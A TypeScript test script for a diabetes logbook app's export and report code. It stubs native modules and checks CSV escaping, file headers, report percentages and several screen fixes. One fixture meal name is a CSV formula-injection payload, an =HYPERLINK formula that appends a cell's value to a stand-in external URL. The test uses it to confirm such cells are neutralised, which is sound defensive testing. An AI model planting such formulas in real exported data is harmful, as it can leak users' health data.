/**
 * Export and report audit pins (G253 D-1, D-3, D-4 to D-10): the real
 * lib/services/export.ts and report.ts run with the native edge stubbed at the
 * module loader (same approach as scripts/reportLayout.test.ts); the screen-only
 * fixes are pinned against the source.
 *
 * Run: npx tsx scripts/exportReportAudit.test.ts
 */
declare const console: { log: (...a: unknown[]) => void };
declare const process: { exit: (code: number) => void };
declare const __dirname: string;
declare const require: { (id: string): any };

const fs = require("node:fs");
const path = require("node:path");
const nodeModule = require("module");

const FIXED_NOW = new Date(2026, 9, 28, 12, 0, 0).getTime();
Date.now = () => FIXED_NOW;
const DAY = 86_400_000;
const tick = () => new Promise((r) => setTimeout(r, 0));

let passed = 0;
let failed = 0;
function ok(name: string, cond: boolean, detail = ""): void {
  if (cond) passed++;
  else {
    failed++;
    console.log(`  FAIL ${name}${detail ? ": " + detail : ""}`);
  }
}

const root = path.join(__dirname, "..");
const read = (rel: string) => fs.readFileSync(path.join(root, rel), "utf8");

const files = new Map<string, string>();
let shares: string[] = [];
let stages: string[] = [];
const fsStub = {
  cacheDirectory: "file:///cache/",
  EncodingType: { UTF8: "utf8" },
  deleteAsync: async (uri: string) => {
    await tick();
    files.delete(uri);
  },
  writeAsStringAsync: async (uri: string, chunk: string, o: { append?: boolean }) => {
    await tick();
    files.set(uri, (o?.append ? files.get(uri) ?? "" : "") + chunk);
  },
  copyAsync: async () => {},
};
const sharingStub = {
  isAvailableAsync: async () => true,
  shareAsync: async (uri: string) => {
    shares.push(uri);
  },
};

let ENTRIES: any[] = [];
const journalStub = {
  __esModule: true,
  getJournal: async (_p: string, _l: string, limit: number, range?: { start: number; end: number }) => {
    await tick();
    const rows = ENTRIES.filter((e) => {
      const t = Date.parse(e.logged_at);
      return !range || (t >= range.start && t <= range.end);
    }).sort((a, b) => (a.logged_at < b.logged_at ? 1 : -1));
    return rows.slice(0, limit);
  },
};

const store = new Map<string, string>();
const storageApi = {
  getItem: async (k: string) => (store.has(k) ? (store.get(k) as string) : null),
  setItem: async (k: string, v: string) => void store.set(k, v),
  removeItem: async (k: string) => void store.delete(k),
};
const generic: any = new Proxy(function () {}, {
  get: (_t, p) => (p === "then" ? undefined : p === "__esModule" ? true : generic),
  apply: () => generic,
});
const NATIVE = /^(expo|expo-.*|react-native.*|@react-native.*|@expo\/.*)$/;
const origLoad = nodeModule._load;
nodeModule._load = function (request: string, parent: unknown, isMain: boolean) {
  if (request === "@react-native-async-storage/async-storage") return { __esModule: true, default: storageApi };
  if (request === "expo-localization") return { getLocales: () => [{ languageCode: "tr", regionCode: "TR" }] };
  if (request === "expo-file-system/legacy") return fsStub;
  if (request === "expo-sharing") return sharingStub;
  if (NATIVE.test(request)) return generic;
  if (request.startsWith(".")) {
    try {
      const file = nodeModule._resolveFilename(request, parent, isMain) as string;
      const rel = path.relative(root, file);
      if (rel === "lib/db/journal.ts") return journalStub;
      if (rel === "lib/db/sugarHourly.ts")
        return { __esModule: true, countSugarHourly: async () => 0, eachSugarHourlyPage: async () => 0 };
      if (rel === "lib/analytics/index.ts" || rel === "lib/services/purchases.ts")
        return { __esModule: true, logEvent: () => {}, isDuringTrial: async () => false };
    } catch {
      /* fall through */
    }
  }
  return origLoad.apply(this, [request, parent, isMain]);
};

const exp = require("../lib/services/export");
const report = require("../lib/services/report");
const i18nMod = require("../lib/i18n");
const { rangeFromWindow } = require("../lib/insights");

const iso = (ms: number) => new Date(ms).toISOString();
const g = (id: string, ms: number, v: number, period = "fasting") => ({
  kind: "glucose", id, logged_at: iso(ms), glucose_level_mgdl: v, period_tag: period,
  source: "manual", tags: [], healthkit_uuid: null,
});
const meal = (id: string, ms: number, name: string, note: string | null) => ({
  kind: "meal", id, logged_at: iso(ms), food_id: null, sugar_log_id: null, display_name: name,
  category: null, portion_g: 100, calculated_carbs_g: 45, insulin_dose_units: 4,
  photo_uri_local: null, personal_note: note, tags: [],
});
const inj = (id: string, ms: number, note: string | null) => ({
  kind: "injection", id, logged_at: iso(ms), site: "abdomen", site_point: null, dose_units: 6,
  insulin_type: "bolus", bolus_kind: "meal", note, source: "manual", tags: [],
  insulin_product_id: null, insulin_product_other: null,
});
const med = (id: string, ms: number, name: string, note: string | null) => ({
  kind: "med", id, logged_at: iso(ms), name, note,
});

const baseProfile: any = {
  id: "p1", name: "Ayse", target_fasting_min: 70, target_fasting_max: 100, target_postmeal_min: 80,
  target_postmeal_max: 180, hypo_threshold_mgdl: 70, glucose_unit: "mgdl", diabetes_type: "type1",
  insulin_mode: "both", oral_meds_enabled: 1, created_at: iso(FIXED_NOW - 400 * DAY),
};

async function main() {
  // ---- D-5 / D-10: CSV cells and file head --------------------------------
  await i18nMod.setLanguage("tr");
  const t0 = FIXED_NOW - 2 * DAY;
  ENTRIES = [
    g("g1", t0, 112),
    meal("m1", t0 + 60_000, '=HYPERLINK("https://example.invalid/?d="&D2;"Detay")', "-2 ünite düzeltme"),
    inj("i1", t0 + 120_000, "+1 ünite ek"),
    med("d1", t0 + 180_000, "@Metformin", null),
    med("d2", t0 + 240_000, "\tsekme", null),
  ];
  files.clear();
  const r1 = await exp.exportLogsCsv("p1", "Ayse", "mgdl", undefined, true);
  const csv1 = files.get(r1.uri) as string;
  const cells = csv1.split("\r\n").flatMap((l) => l.split(";")).map((c) => c.replace(/^"|"$/g, ""));
  const risky = cells.filter((c) => /^[=+\-@\t\r]/.test(c) && !/^-?\d+([.,]\d+)?$/.test(c));
  ok("D-5 no text cell opens with = + - @ tab or CR", risky.length === 0, JSON.stringify(risky));
  ok("D-5 formula meal name is prefixed", csv1.includes("'=HYPERLINK"));
  ok("D-5 note, injection note and med name are prefixed", csv1.includes("'-2 ünite") && csv1.includes("'+1 ünite") && csv1.includes("'@Metformin"));
  const glucoseLine = csv1.split("\r\n").find((l) => l.includes(";112;")) ?? "";
  ok("D-5 numeric glucose cell stays a bare number", /;112;/.test(glucoseLine) && !glucoseLine.includes("'112"));
  ok("D-5 exportable csvEscape keeps numbers (negative included)", exp.csvEscape("-5", ",") === "-5" && exp.csvEscape(-5, ",") === "-5" && exp.csvEscape("=1+1", ",") === "'=1+1");
  ok("D-10 BOM first, no sep= line (tr)", csv1.startsWith("﻿Tarih;") && !csv1.includes("sep="), JSON.stringify(csv1.slice(0, 14)));
  await i18nMod.setLanguage("en");
  files.clear();
  const r1en = await exp.exportLogsCsv("p1", "Ayse", "mgdl", undefined, true);
  ok("D-10 en keeps BOM and comma delimiter", (files.get(r1en.uri) as string).startsWith("﻿Date,"));
  await i18nMod.setLanguage("tr");

  // ---- progress: the share stage is announced before the sheet ---------------
  files.clear();
  stages = [];
  shares = [];
  await exp.exportLogsCsv("p1", "Ayse", "mgdl", undefined, true, (p: { stage: string }) => stages.push(p.stage));
  ok("CSV announces the sharing stage last, before shareAsync resolves", stages[stages.length - 1] === "sharing", stages.join(","));

  // ---- D-1: KPI and bar come from one count --------------------------------
  const vals = [100, 120, 150, 200, 255, 260, 265, 270, 90, 110];
  for (const high of [260, 300]) {
    const prof = { ...baseProfile, target_postmeal_max: high };
    ENTRIES = vals.map((v, i) => g(`h${i}`, FIXED_NOW - (i + 1) * 3 * 3_600_000, v));
    const doc = report.buildReportDocument(prof, rangeFromWindow(7), ENTRIES.slice().reverse(), { mode: "full" });
    const html: string = doc.html;
    const kpi = html.match(/<div class="kv">([^<]*)<\/div><div class="kl">Hedef aralığında<\/div>/)?.[1];
    const bar = html.match(/<\/i>Aralıkta ([^<]*)<\/span>/)?.[1];
    const vh = html.match(/<\/i>Çok yüksek ([^<]*)<\/span>/)?.[1];
    ok(`D-1 high ${high}: KPI equals the bar`, kpi != null && kpi === bar, `${kpi} vs ${bar}`);
    ok(`D-1 high ${high}: very high share is the rest`, vh === "%40" && bar === "%60", `${bar}/${vh}`);
  }

  // ---- D-3: mixed data names the whole set ---------------------------------
  const cgmPoints: any[] = [];
  for (let t = FIXED_NOW - 10 * DAY; t <= FIXED_NOW; t += 5 * 60_000)
    cgmPoints.push({ logged_at: iso(t), glucose_level_mgdl: 140, source: "health", is_cgm: 1, t });
  ENTRIES = [];
  for (let d = 0; d < 20; d++) ENTRIES.push(g(`f${d}`, FIXED_NOW - d * DAY - 2 * 3_600_000, 130));
  const docMix = report.buildReportDocument(baseProfile, rangeFromWindow(30), ENTRIES.slice(), { mode: "full", cgmPoints });
  ok("D-3 PDF source line says sensor and hand-entered together", /sensör ve elle girilen tüm ölçümler/.test(docMix.html));
  ok("D-3 PDF no longer claims only hand-entered readings", !/Veri: elle girilen ölçümler/.test(docMix.html));

  // ---- screen / component source pins ---------------------------------------
  const data = read("app/settings/data.tsx");
  ok("D-6 runCsv and runPdf catch, log and toast", (data.match(/catch \(err\)/g) ?? []).length >= 2 && (data.match(/export\.failed/g) ?? []).length >= 2 && data.includes("logCrash"));
  ok("D-7 one export at a time guard", data.includes("busyRef") && /if \(busyRef\.current\) return null/.test(data));
  ok("D-7 menus ignore taps while busy", (data.match(/busyRef\.current\) return;/g) ?? []).length >= 2);
  ok("D-8 range export waits for the Modal to dismiss", data.includes("onDismissed={startPendingRange}") && data.includes("pendingRangeRef"));
  ok("D-8 busy state ends at the sharing stage", /p\.stage === "sharing"\) endExport/.test(data));
  const picker = read("components/DateRangePicker.tsx");
  ok("D-8 picker forwards onDismiss to the Modal", /onDismiss=\{onDismissed\}/.test(picker));
  for (const f of ["components/DateRangePicker.tsx", "components/InlineDateTimePicker.tsx", "components/InlineTimePicker.tsx"]) {
    const s = read(f);
    ok(`D-9 ${f} follows the active theme`, !s.includes('themeVariant="dark"') && s.includes("themeVariant={THEME.scheme}"));
  }
  const ins = read("app/insights.tsx");
  ok("D-4 Android lock layer is opaque", /Platform\.OS === "android" \? \{ backgroundColor: THEME\.bg\.base \}/.test(ins));
  ok("D-20 insights load has a catch and resets per profile", /logCrash\(err, \{ screen: "insights", op: "load" \}\)/.test(ins) && ins.includes("loadedProfileRef"));

  console.log(`\n${passed} passed, ${failed} failed`);
  if (failed > 0) process.exit(1);
}

main().catch((e) => {
  console.log("ERROR", e);
  process.exit(1);
});
